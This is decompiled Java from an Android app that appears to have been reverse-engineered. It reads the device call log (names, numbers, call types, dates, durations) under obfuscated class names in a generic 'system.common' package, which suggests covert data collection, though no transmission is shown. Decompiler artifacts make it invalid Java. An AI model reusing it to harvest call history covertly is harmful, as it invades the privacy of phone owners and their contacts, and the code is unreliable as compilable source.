package com.app.system.common.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog.Calls;
import android.support.v4.content.ContextCompat;
import com.app.system.common.entity.Call;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class b
  extends a
{
  public b(Context paramContext)
  {
    super(paramContext);
  }
  
  public Call a()
  {
    try
    {
      if (ContextCompat.checkSelfPermission(this.a, "android.permission.READ_CALL_LOG") != 0) {
        return null;
      }
      Cursor localCursor = this.a.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
      Object localObject;
      if ((localCursor != null) && (localCursor.moveToFirst()))
      {
        int i = localCursor.getColumnIndex("name");
        int j = localCursor.getColumnIndex("number");
        int k = localCursor.getColumnIndex("type");
        int m = localCursor.getColumnIndex("date");
        int n = localCursor.getColumnIndex("duration");
        long l1 = localCursor.getLong(localCursor.getColumnIndexOrThrow("_id"));
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        ((StringBuilder)localObject).append("Recent ID = ");
        ((StringBuilder)localObject).append(l1);
        com.security.d.a.d("CallHis", ((StringBuilder)localObject).toString(), new Object[0]);
        localObject = localCursor.getString(i);
        String str = localCursor.getString(j);
        if ((localObject != null) && (((String)localObject).length() > 0)) {
          break label194;
        }
        localObject = str;
        label194:
        long l2 = localCursor.getLong(m) / 1000L;
        long l3 = localCursor.getLong(n);
        m = localCursor.getInt(k);
        if (m != 7) {
          switch (m)
          {
          default: 
            m = 2;
            break;
          case 2: 
            m = 1;
            break;
          }
        } else {
          m = 0;
        }
        localObject = new Call(l1, (String)localObject, str, l2, l3, m);
      }
      else
      {
        localObject = null;
      }
      try
      {
        localCursor.close();
        return (Call)localObject;
      }
      catch (Exception localException2)
      {
        com.security.d.a.a("CallHis", localException2.getMessage(), new Object[0]);
        return (Call)localObject;
      }
      return null;
    }
    catch (Exception localException1)
    {
      com.security.d.a.a("CallHis", localException1.getMessage(), new Object[0]);
    }
  }
  
  public List<Call> a(boolean paramBoolean, Date paramDate1, Date paramDate2)
  {
    ArrayList localArrayList = new ArrayList();
    try
    {
      if (ContextCompat.checkSelfPermission(this.a, "android.permission.READ_CALL_LOG") == 0)
      {
        com.security.d.a.d("CallHis", "Has role to read call log", new Object[0]);
        ContentResolver localContentResolver = this.a.getContentResolver();
        Object localObject1 = CallLog.Calls.CONTENT_URI;
        Object localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        ((StringBuilder)localObject2).append("date > ");
        ((StringBuilder)localObject2).append(paramDate1.getTime());
        ((StringBuilder)localObject2).append(" AND date <= ");
        ((StringBuilder)localObject2).append(paramDate2.getTime());
        localObject2 = localContentResolver.query((Uri)localObject1, null, ((StringBuilder)localObject2).toString(), null, null);
        while (((Cursor)localObject2).moveToNext())
        {
          int i = ((Cursor)localObject2).getColumnIndex("name");
          int j = ((Cursor)localObject2).getColumnIndex("number");
          int k = ((Cursor)localObject2).getColumnIndex("type");
          int m = ((Cursor)localObject2).getColumnIndex("date");
          int n = ((Cursor)localObject2).getColumnIndex("duration");
          long l1 = ((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndexOrThrow("_id"));
          localObject1 = ((Cursor)localObject2).getString(i);
          paramDate2 = ((Cursor)localObject2).getString(j);
          if (localObject1 != null)
          {
            paramDate1 = (Date)localObject1;
            if (((String)localObject1).length() > 0) {}
          }
          else
          {
            paramDate1 = paramDate2;
          }
          long l2 = ((Cursor)localObject2).getLong(m) / 1000L;
          long l3 = ((Cursor)localObject2).getLong(n);
          switch (((Cursor)localObject2).getInt(k))
          {
          default: 
            k = 0;
            break;
          case 3: 
            k = 0;
            break;
          case 2: 
            k = 1;
            break;
          case 1: 
            k = 0;
          }
          if ((paramDate1 != null) && (paramDate1.length() > 0)) {
            break label332;
          }
          paramDate1 = paramDate2;
          label332:
          localObject1 = new com/app/system/common/entity/Call;
          ((Call)localObject1).<init>(l1, paramDate1, paramDate2, l2, l3, k);
          localArrayList.add(localObject1);
        }
        ((Cursor)localObject2).close();
      }
    }
    catch (Exception paramDate1)
    {
      com.security.d.a.a("CallHis", paramDate1.getMessage(), new Object[0]);
    }
    return localArrayList;
  }
}


/* Location:              ~/com/app/system/common/a/b.class
 *
 * Reversed by:           J
 */